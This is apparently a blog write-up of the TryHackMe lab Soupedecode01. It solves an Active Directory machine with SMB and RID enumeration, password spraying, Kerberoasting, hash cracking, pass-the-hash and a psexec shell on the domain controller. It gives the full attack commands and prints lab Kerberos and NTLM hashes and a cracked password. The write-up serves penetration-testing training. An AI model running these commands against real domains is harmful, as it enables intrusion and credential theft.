---
title: "Soupedecode01 TryHackMe" 
date: 2025-08-1 23:50:00 0000+
tags: [WriteUp, Soupedecode01, THM, SMB, Enumeration, Bloodhound, Hash Cracking, Kerberoasting, Lateral Movement, Password Spraying, PTH, Windows]
categories: [WriteUps, TryHackMe]
image:
  path: /assets/images/Soupedecode_THM/preview_soupedecode01.png
---
# Soupedecode01 THM Writeup

Soupedecode1 is an easy Active directory machine which focusses mostly on enumeration, SMB enumeration, RID Bruteforce, kerberoasting, hash cracking, pass the hash attacks and finally through PTH we can list shares on the DC meaning we have Administrator on the box thereby submitting the root.txt.

![image.png](/assets/images/Soupedecode_THM/image.png)

## Enumeration and Exploitation

As always we are gonna start off with the rustmap to find open ports and services.

```bash
rustmap.py -ip 10.201.119.45
```

![image.png](/assets/images/Soupedecode_THM/image%201.png)

![image.png](/assets/images/Soupedecode_THM/image%202.png)

Looking at the above results we picked up the NETBIOS ,hostname and the domain name of the box, added them to our /etc/hosts file.

### DNS Enumeration

The port 53 is open so lets start with the DNS enumeration using **dig.**

```bash
dig @dc01.soupedecode.local soupedecode.local MS
```

![image.png](/assets/images/Soupedecode_THM/image%203.png)

```bash
dig @dc01.soupedecode.local soupedecode.local TXT
```

![image.png](/assets/images/Soupedecode_THM/image%204.png)

Nothing useful found with the DNS Enumeration.

### SMB Enumeration

Ports 139 and 445 are open on the box, lets enumerate some SMB shares on the box.

```bash
nxc smb soupedecode.local -u '' -p ''
```

![image.png](/assets/images/Soupedecode_THM/image%205.png)

We dont have null authentication on the box.

Lets try with the guest authentication.

```bash
nxc smb soupedecode.local -u 'guest' -p ''
```

![image.png](/assets/images/Soupedecode_THM/image%206.png)

We can authenticate as guest account.

Enumerating shares as guest.

```bash
nxc smb soupedecode.local -u 'guest' -p '' --shares
```

![image.png](/assets/images/Soupedecode_THM/image%207.png)

Connecting to the **IPC$** share, but it didn’t listed anything for me :(

### RID Enumeration

We can authenticate as guest so lets perform a RID cycling attack on the domain.

```bash
nxc smb soupedecode.local -u 'guest' -p '' --rid-brute
```

![image.png](/assets/images/Soupedecode_THM/image%208.png)

We get numerous users and machine accounts on the domain, saved all these accounts to potential usernames.txt.

### Kerbrute Enumeration

Using to kerbrute to find that we have the correct usernames.

```bash
kerbrute userenum -d soupedecode.local --dc 10.201.119.45 usernames.txt
```

![image.png](/assets/images/Soupedecode_THM/image%209.png)

![image.png](/assets/images/Soupedecode_THM/image%2010.png)

All the 1068 usernames are valid !!

### LDAP Enumeration

We have usernames and no passwords, so lets try a password spray on the domain with the usernames only.

I will run this nxc command and by grepping the “+” sign the filter the valid hits.

```bash
nxc ldap soupedecode.local -u usernames.txt -p usernames.txt --no-bruteforce --continue-on-success | grep "[+]"
```

![image.png](/assets/images/Soupedecode_THM/image%2011.png)

We got one valid hit saving these creds to creds.txt file, now lets try to enumerate the SMB shares on the box.

### SMB Enumeration 2

Now since we have valid credentials we can authenticate with SMB to find any new readable shares on the box.

```bash
nxc smb soupedecode.local -u ybob317 -p ybob317 --shares
```

![image.png](/assets/images/Soupedecode_THM/image%2012.png)

Now we can have READ access to the **Users** share in the domain.

Using smbclient.py to connect to it.

```bash
smbclient //soupedecode.local/Users -U 'ybob317'%'ybob317'
```

![image.png](/assets/images/Soupedecode_THM/image%2013.png)

lets just dump all of the downloadable things from this **Users** share.

![image.png](/assets/images/Soupedecode_THM/image%2014.png)

In the user **ybob317** directory we found the user.txt, submitting it.

### Bloodhound

Lets do some bloodhound analysis.

Collecting data using the rusthound-ce.

```bash
rusthound-ce -d soupedecode.local -u 'ybob317' -p 'ybob317' -f dc01.soupedecode.local -c All -z
```

![image.png](/assets/images/Soupedecode_THM/image%2015.png)

Found some of the kerberoastable users in the domain.

![image.png](/assets/images/Soupedecode_THM/image%2016.png)

After finding some kerberoastable users in the domain, doing targeted kerberoasting on them.

### Kerberoasting

```bash
/opt/targetedKerberoast/targetedKerberoast.py -v -d 'soupedecode.local' -u 'ybob317' -p 'ybob317' -U usernames.txt
```

![image.png](/assets/images/Soupedecode_THM/image%2017.png)

Got the hash for the above 5 users in the domain.

Stored all these hashes into hashes.txt file.

Our hashes.txt file looks like this

```bash

[+] Printing hash for (web_svc)
$krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$soupedecode.local/web_svc*$a6969efbad81235bc007808fe70e8816$fae8ad626837fc609edbd62e206d6028cdfad3e14c9fb9d55914e1f95dd0625d803505e443c93d031034b9e0f4dd54100d21755a6e2769e3b3db927db3d69f268cceb03dd87ed1e8dee581fdc50946a00417615dfa1d43cc819066add97438ecde6f94f1ef67d791c9ddfd7a751fbfab9aa93d530084ab059300a8d758a12e043562253c8a4155e36280a64baf9e77d47ce704b5e499445ab1aa128bdd88d0588439f6424b724ebe6a2f0c9acdce1b312fbd30f313453d828cfe0b154ab2435a26a5e7c55e4da41eb7d54013b99e3c037f5187ad0659e1a33afdf060b33e097689731c494f574480b8d331797ec0cee8587ae064c4c809dc8dc4455f573aba6a7d858f06d7a16e1247f3ddfc51de7a489d3690ff25d7a1614aecfe109ddfbc8c5b1f5f73bc9bce0bbad252c00233373d3dd5670c2bf3eb22026d791e305b8ec6f2b53d95b459dd2d312417bdd45af6b8431d3a55320dc0defbde877c46bb95ff8bd7de9b7f4fbfe62106c0ab745b3259624f7c454be0fdd4274a3e0b4d6ecb07227e462d719164c1de5b7b09da41d8b2ccb2264ba9b5d9fc3f4f4e07f82095388c8e0b95f92c52d119da6b67863df3033caff9c41a58e40abb32cd405cdca41d2e2c19154660a6f9e16f50bcb6a32d08480fef0d01a6f72f14ea768d0cb49bff8c3f66243bc111125dd22ea9e08dea1db6c1701fe944bd8fdc63d11fd5310d914c5932d34b7fc2f66ab8796f32710a6b4700c72d0b73937191fa7348ec084779e1619bf6e6aac6d2e1c924681a6a46210cdb1966b7c777917c0263cf666864b121a0f256ab662c3c4af8a2fca4c3b3804871fd1264aea0dfd48d00a0607d03f0350a84a21bcf294e5b137b5a09d1d8c95020edc2b5db6ddee835063edaa029f5b47ecab97456969e50d3537c1a6e6f2a039f531201d29559c8416facf750b54db174b4c828bf88fa129f045af8b6ad3cf7a82a6026bcef33cda51d8a7c7f136428ba78a9d3c89ca697e882a7323fb8411c486acfce3ad5c0d32ceb6f7361f1f1fa124ea9f417a7168fd1551c3fc9f20d942ef87059d023c8c66950f8bf936b1dc60236e2826707c26ef8f21aaf7fac0aca30cc30868792148b0215bf3c6542ce9ef2a67d51005a0f85a53362a63bdf316eedbec80fb0ad20a5bc70162ee55c0c2cb85d0c5bfc58503f6d9cf710d8b0aee1561b9fcc1ed3113b49a4ea7aaf45d803824d4127f11ca9ab1488d4459abd21241e5532f5e941c69e330267a552e6338b3659518a8e4f310ce8f12cd75b146b64c7ae582d31e602c81d12c4feaa32fe187c43f47ff5ac5cdf0a5cff9282b39c45b20107343a9839afc656ac22b3a8de086a97c5ec7468fa448302456fcb5ff908a139be216f9d268560bab8605d94932bdca660dc2333c2edf4847a3e0d5b9439245a1f42f4e5c48ca25f2b9b17fad4121f04b5058662f79099659dc506b91e21c87a1085bdeb49497d8494b72fab817f
[+] Printing hash for (file_svc)
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$soupedecode.local/file_svc*$21a1ef84e6fae7be6bb2649a431a0575$52d432ea30879f583460fa4c95b5b71b28bafdf47014990c9fcf10335750f3f9a3199ec8021edcbfa1bae7eb6297f18605ed6ffa93201a64847f7b250f91fc2fdd9ac88aac2bad69fd176e9d74f759e7e9d3a7eb10224e99e4d76f5666629d5ea5f869625916bf7aa9d7131168205c964240b0dfc82cb9358f086aead73b8454ff69df84fc10290c4a93685067b1a2aebac6a95743fd1c3a67c3aa35269d7fc3dfba9da3cec8affaca85bc44b482a40444c1651cffdbb9fb352ef857b66c4bd701074a04b5d7fbb4b074b8d1baf7d42122b546b8cac7d3dadb34ad2e894f4cbd9207c603b8b485ffeb54c3615957a02b4e9587c3587cbbb700599923c8be9a9fca563f6e8e0a677186d70dba33fb68c72a1a435630c6d771612ffe6c37a4a1ecfd2c4975df572b3da6bc492cfc76905b2b6d7dd09733245fdd65b5c8229c8f6b21b83aa1f2ba4cb0e0b862a396a5854091721d096f5675e69d9b179173d47e90303d91bfded3213e59799d1cdb2ea5a34a5281185adb583f2371f5d21934b999cdb6a056f47e03f375e7a07ec05e112f2eba39260b2a4dad617a195e242978386be20b8575197736b83ad107fcf55e3ae43223d51e9ad1f25e62c00a2052985fc680bc74d4fb306846843adfba6ccd51c9e52a8b1e21d1c7ec9b4a5cd7d9862ea2ad11c6d3f655405cb728ed55801ee05c123dfe96e3f40fb9203fe0f162cc372cffca7c5afb45a175b11144e93f8696873c12c3ac5ca6e0bb4e9ba5656716a0225a6936c4f28549bfd8c6f4230bdfb290796d286ab4ff0944e8e838dfb0df59f420b628ff7bebd33d403ee33d56de407948a0fca9ed86e3ff412f05020e5b70687354840ebef8e28617ad4b4129fa1017e61637381cc342db171a1c4b3ee46109a79d2d072e4a3b62dcd26681113173ca4951ad3438ab72a8f12c96765cc981f28dbeccad37178bfcd39094859f986fdee2f6f6993a04a646f2eee0d543dea65cd3b96945ffe311f3cd02b22e850113187bf06d45068980599b4e3056976cb00af59a4020ddcca97f3ce81399ad333fff0bfa0456174faadab3156c3a86c46878a43ef347c9cccb05c70f2e84467af269c74af52559e6ca775167c14f44a3957dfde2a85e4e2cab2d4766c49e31a1bd933caa1633eeac5c27948d315a22257701b4aad8b580b0cea4605002a5fd8f717dc3e2d84c72d29149f1ccb32ec55330930fb2c4510bbff4adbe804c998564533056c6197a2a2b4ca5cd9c3bed60022e5b79dc3bf91cee8c0f66cd8d94bd63e1d1fd14b4581a74f55dfea501f7ed59aea0d45516f255226a6e14bf7427188b6b5b5afc81876b263fff2f152116d3692ea9e3e3e78659c0e9b99826c632122a6a4b3f3e6ff4ca3b3bda7f0862822b1eb6348388262bf27367346fbaaa60c2aa5b8557ef100d5f4cafd9999a45bf60dd9723dcb7e63d292123bb50b2dc7191f36b75dcbce8908033afd0370115ed27a6c385
[+] Printing hash for (backup_svc)
$krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$soupedecode.local/backup_svc*$20a19345b9f1194b37193eb9967fd3bf$5df0a5d745d17078bb2c5784198ff33d0a8e972cbebe3e9af31f8db7d017088f3f5e5d41655fe5897fc64e214c169160cfe6d7519549fed6b2b45cc6821ba2a2c87cc45b0526b7da7769d5e6ed6df736c8753ea8dfeb14f5fbabd35627c58bc20a5c9693c5755cd2190c199b0a24120e53c525562d7bc8e88320738d16e3177aa06927ea155eb7d8fb089028db30e1986ef7cc92d3ab0c2cf0aa4e1bb331dadf78e1e0760557bc29a1bfc6d131993473c6501e26205ef5d89bd1c9a5c183ef6c5065eb71d1fd74eca2e0fa9a77f3638d0db936330fa124c1499f5e91e4b45ca367cc8ad67ee2a51284c8656179b57256ffbdf3ee55f66dc2173eea6e0ac756c1b3d7132b9276d4090ebe0669c4e765cd738c1f6e54af33d2916974add8701fd45685cda9f2d731d9ba7d71072ec1ef6d45a81ae04d479466bc80b4ba9c8e75a29c517c74218e5f410aecf22efebfd796e36adc270e257a57a436b4130c28471058c243c09b808e2c3b4362d594db6ec181ebcba33cda2a09721024e355ceadb6862f614a22bbc0c0283bcc372aa49e919fa7f4cab8a4b206c42729e05b7598be18adf6300ff4b32e2df56f4d62486d58517c687c34535cb17ecaaa4540e17746fffc8a4abb6fcd1972192268f33de171a55c157e20d5ed2f9d85ecf5ec07d54b5b6cc0769d6629b3d146a85643ac305cbea80317cc5af62a2ed7050d46895438187a8608d7f118ab587b33f9014dbdb56ed24911ba09aff6eca15ac0a81070f79ea4906540a4f58a25af5e47e82ff1102c595268c8094a952f043c9503ae0f4f55032713f1b7ec236567a0fc3e8606645615d0b4734891e3beb421f754eb4e7f53d1dff3bda006d89957c45c600fc27ed607b7f2fb8bbbe6e939d03c53eaf8c93e7f5ec55b9526b2a2b27fa66efde4971153d62637600269078bfdd2b0c6c203b0967b80afa72b7b86f455aae6a06179b6a53831418f93e741bca1c7a2335db0bef351193a548d1c998e68bd94e881fca500c61c8934f147c64fe6559486197995595bdefa479ec75521c60e72116887eeca7e5b7ce16f1fc6c7b471dbb9e734a6dc6961167ad23b35c74c107ba959c9b89f9af7833db5d2141153914a71d6258fe9aa26e6d397b980bf20d15f0e69a581b0914222ec670ebe3e88a8017f8b115324c3fbc3de094ca17aa44c875a0d17588db3c7ff5b22071ad0384dc45c21ced3f222629d91d85a7c3960a5f6c617d723f59c9390cc362eea66d249dbbfaaaaa390df015e7d38deaa9a56c5c91d70a57bec93f8fc8bdf8a472fc36c0729bc4bb10ab18329fcac3de6e21f846692b45914e3748009a583032c64dcabc04ff40147df9531475c7d0166d0fef882dad8ff913b4b4160680d3a7fa9f090d21051af79396a093e034f8973fc474c47094abc4210c23164aa281f596b89df3d6342f27249a63410593f461f8e10623112a3c7c8bc58dddcd4921427c0d3ea0d8f70f1d1
[+] Printing hash for (firewall_svc)
$krb5tgs$23$*firewall_svc$SOUPEDECODE.LOCAL$soupedecode.local/firewall_svc*$9a98a031ef2b469f5b99ab07a6c269ad$4bab78ed6c1c45610bb145fbe84ff7143a35ca5ca5004d372a776661a8060834441537bd92d8bd1ba4e6d295bbaec766f7bb42dce3b048e9a49b71ccd74d396203b31c77c6f5beef7d6f8a4ff5f36a854948320f76f589d714ed6c851cbd1ec3f914fd063ca9cad1dc96fcb0d92f0cf916a772ca9e1c1d2b888ee7d567719e1d30741d80d5ff623f70b79a2d0d6aceb76f3aa12830de8600a59e7495f2e95fa97bcc0928464d9210a45a25377bec03f47f3776e62e06cd3bdadde0211a5a67fa7af9981fa9071457dc2f372bfabef8626661a878df8a2adc8ca44a6cf4ffef70b223b56ab0d1d6720c45bdf89b475fa365059617d7b3e00782321158b94a129d503749567967bab964de6f085cfb4f7ea1913e2fed6215ead89dd2da8eace3d580b5ba2bb27188ab9209b73af24c7d91aea8cc9f81823c573363ff4de5bd6efee4fadfa18f9bf051d19328a4ea4f9e2c30fa6bc23f7711ccb7bb16e28a640389545197a810bb802fe2e8fcf83346a4b9818dfbf1890c42fb297353a34db2068591323163df9a824e1a218cee7c7d7e0499d40e0b55cf83ba6fe65f0bc5a4a38368479b95d3baeca880f92899de66fc9fdd4bdc4ae7e7c103dc53add73235c0c5e2c6133aa38c690a6b6b41bfebe857599d68c5c92ecbaff41cfce8483a3f84e120e36a00ecf89ebf95af48a3e104360651d2b30ec4621dafe4b4c793c6c0ad0bb24ee4d94c8dd906e7ebe053194abbfc711baba43122e55a568024f1a6747d026a9b29d301fc73f3b3e6729813a96aeec7881c7af4d87ef41ca77ad48ac2055bfbddfa1f1fd3da6c1deb9603e90a90839ec394e62a3238e2e3b8758d0b4f556348939c5a0034197d7ac2ac8f01c2985e76ab658c5f4a6074460f9bdcb1117328cdfcdbb024a34cc5550fa693b7652bf10d198236a05e7528e9fe5a3453c0e72fe209342d954f2af0fdc694a43e5b09a76f277297cd002e08806b430af3f7c0ff5a3e87886346025c29acf8e363365840190f16778ef3454b6de4bc8e64d38c0e16528980d298c3231d25538e2493f56bebdc542e45c56bcc6345d542daa7b5ca46836a5e56e9d85e9492d3c9cac503e7cbf8934084a76b8a0e0d760fe367eeaaf728ea1b1a261e215c1dac92057863f49c3c62e2ce37333ada3f639d4dbd17490c3783a50cbc8e0a69bc7d00245c5d70d1d9fd55634ee905a9424a4a354c9c70a51d301502ea6532d56ad59d7f85c678f815ce4cf5b666c69790d0dfaf32ed689b8c913cc5cf3c55bc2579f1a8c2e412a40776bfce256c5011ea6c5d5058662de6d167d559e5d839ae765ae0c5dee9a69dbe50a089fff9cac0e49ddb3ddce8bee9fe7996462eb7fd3bbcfad7fbd7e8da9bd07f11ae5c6ddf9cbeb3e0f8e8fe4db0f8a67f939afbc29b3dc02454ceaba04b1a9b24d97015c8723a95ebcac2883c8bfc97cb0a723cc4a2ae83cd153edad32cd08ac2b729af4c2745afc94547155e91
[+] Printing hash for (monitoring_svc)
$krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$soupedecode.local/monitoring_svc*$c045ac444ca34eff4a06e41c13e9fd25$c2fe8f49cc93ca88e832948b7b3a66364edda90d949133360b5b3ae128c6b698d908e6638263d03c3cfa3129670acbfef1b48f2ba084f2fc8ef1a26b320a13d2f4da5409c5888ec85db6de57d230a042afe30b6731585e97bdb42b58a7220c2cc8595770f8da940ec8c6e8e08dc3116e8d4961cd94b91f6e2609ced357a6afcdc01be83fcc955dc5be98fefeaa9a496bb7e86513c74c0d4d45fc1d7879aa06a50944f1e49a6c34dbe5f1eb04634396772ed0209db06b27fac6beb58e68edd38958465b4cb3eedcf1799034cd70549f2e7d0d07d9e4db3f36526966e8f2cddea42c4548dfdc836558fa3fdcec281cbeaf538fff8cdd8fb16e475433436c591b302f494953bb6569fe40a1a9820af59ba0497affbe37d000e1d63a20902b6946c7adc9e730593392f7bc2d84802452a66d4519a27d90166e3182cbd5ad2fb19f9d5395b5358458469a86bdc01162482221d7b7e0780bcdaf3f99aa2c1cd8f0e456905798b4bbd1a2cac00a0e6ef39ccd4bba9598fbd206d8a266846641450866149711f93d6024ab449eea399703b8eda9cd926cbf207593dea7473afe8aa02e28a02e1f498b04d5bbfca1ac5d71cf9153543039b2163b33b09f441c99c4140363315920f21cdb80918f129b3d302b79ec9f6b82b75ca7d452a745fcfb0f8d1f9f52703f3f041a21c326eb0cd09337f6823d13fa305a863e041cc7312963ad356a4307b697ad26bc007b657ae7fa7539c0ac40b53d40be06f280eb1e1291954ca5749ca51bdbba3fd22f12461b67ea14bf1fb8db4aca913cca2d4812c613c8b6df68a98c4bf496d770ecb58aef5b8dd2a50565d66319053cb34ef9617e902d182c3c1077953c2c9191e1005835446e5c8a97ae1dd46486468b41c0357604dd252e799d0f10d18b88c59a9fef9566bbf5bafda339edb94f266d67af1c37e862d94002ccd9a3fa328bebda00623063203a7433d62d9a4bd0b9b9ec346d0a8cb94e4b180f4a6e8ddd222a34a52288b1854e08a184d2860ba54451ea1fedb360362ff3c05f1f08e27f9144a30b823a8f14aa53afda340954651fdf9d1fd6e3e5a6dbc2cfb87b362a223461aedeea971dd0a947b6a4f23295166a26fd0cbdc2992714551caa647b1541ce7c50efcc3ce9ce7f5eeb49d978169147dbef915db553c6b75dfbdaed213624e676719617de36d34d9c09d843ccbb887aeb3ddbee14ebcfd86c36f56b2a5140187f3f98d190e78b2366497c52957859356edb826f294b3a311dd53723455ce4570569f1dad772e3964bd65982c3d458056f1df13a9c99808620a403349205b399680f16e95603e37ae88ee63f1fd57bd55178c16db84a031df65420f4179eb9c66e587dbdfe3140fd9f0185551e8c77ec654fbc73445f16eadedc1f904018d369de1f93a5c9b77e22033c06d728dfe2b56c0d8ddacb26bcf084b6f22cfa0d12f70c5c20599de247caef0d11f91edefded25d5b0e323f1a5cf7396

```

Now lets crack there passwords using JTR.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

![image.png](/assets/images/Soupedecode_THM/image%2018.png)

![image.png](/assets/images/Soupedecode_THM/image%2019.png)

We got this password for the **file_svc** account on the domain.

Saving these creds to our creds.txt file.

### SMB Enumeration 3

Now since we have a valid ldap authentication with our new user **file_svc.**

Lets try to enumerate shares with this user.

```bash
nxc smb soupedecode.local -u 'file_svc' -p 'Password123!!' --shares
```

![image.png](/assets/images/Soupedecode_THM/image%2020.png)

Now we have READ access to a new share i.e **backup.**

using [smbclient.py](http://smbclient.py) to connect to this share.

```bash
smbclient //soupedecode.local/backup -U 'file_svc'%'Password123!!'
```

![image.png](/assets/images/Soupedecode_THM/image%2021.png)

There’s a file in this share, let see what does it say.

```bash
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::

```

### Hash Cracking

Lets crack the hashes obtained from the **backup share** on the domain.

![image.png](/assets/images/Soupedecode_THM/image%2022.png)

These are NTLM hashes.

### Pass the Hash

Since we are in a windows environment and we have NTLM hashes.

We can perform PTH attack in the domain.

**And from bloodhound we have**

![image.png](/assets/images/Soupedecode_THM/image%2023.png)

We have the hash of **fileserver$** account which is a part of **Enterprise Admins** group who has **GenericAll** on **DC01.SOUPEDECODE.LOCAL**

---

Lets verify that we have a valid hash for **fileserver$.**

```bash
nxc ldap soupedecode.local -u 'fileserver$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'
```

![image.png](/assets/images/Soupedecode_THM/image%2024.png)

We have valid credentials.

So now we have **GenericAll** on **DC01.SOUPEDECODE.LOCAL**.

Using BloodyAD to exploit this privilege and lets do a **ShadowCredential** attack on the DC.

```bash
bloodyAD -u 'fileserver$' -p :e41da7e79a4c76dbd9cf79d1cb325559 --host 10.201.119.45 -d 'soupedecode.local' add shadowCredentials 'DC01$'
```

![image.png](/assets/images/Soupedecode_THM/image%2025.png)

The PKINIT is disabled on the box so we cant request a TGT for the **DC01$.**

I also tried using ceritpy to request a TGT.

```bash
certipy auth -pfx 'DC01$_Zh.pfx' -dc-ip 10.201.119.45 -ns 10.201.119.45 -username dc01$ -domain soupedecode.local
```

![image.png](/assets/images/Soupedecode_THM/image%2026.png)

But still it shows the same kerberos error.

This happens when the PKINIT is disabled on the box.

Since we have **GenericAll** on the DC, we can also change the password of that machine account.

Using bloodyAD to change the password of the **DC01$.**

```bash
bloodyAD -u 'fileserver$' -p :e41da7e79a4c76dbd9cf79d1cb325559 --host 10.201.119.45 -d 'soupedecode.local' set password 'DC01$' 'aashwin10!'
```

![image.png](/assets/images/Soupedecode_THM/image%2027.png)

We were successful in changing the password!!.

Now lets just winrm into the DC as port 5985 is open on the box.

```bash
nxc ldap soupedecode.local -u 'DC01$' -p 'aashwin10!'
```

![image.png](/assets/images/Soupedecode_THM/image%2028.png)

Although I had valid creds to the DC. But I cant winrm into it.

```bash
nxc winrm soupedecode.local -u 'DC01$' -p 'aashwin10!'
```

![image.png](/assets/images/Soupedecode_THM/image%2029.png)

So instead of overcomplicating things lets just use **fileserver$** account’s hash to login using psexec.py

### Shell as fileserver$

Using psexec.py to login as fileserver$.

```bash
impacket-psexec soupedecode.local/'fileserver$'@dc01.soupedecode.local -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```

![image.png](/assets/images/Soupedecode_THM/image%2030.png)

lets grab that root.txt from the Administrator’s directory.

![image.png](/assets/images/Soupedecode_THM/image%2031.png)

Submitting our root.txt file.

Rooted!!

![image.png](/assets/images/Soupedecode_THM/image%2032.png)

Thanks for reading 😊
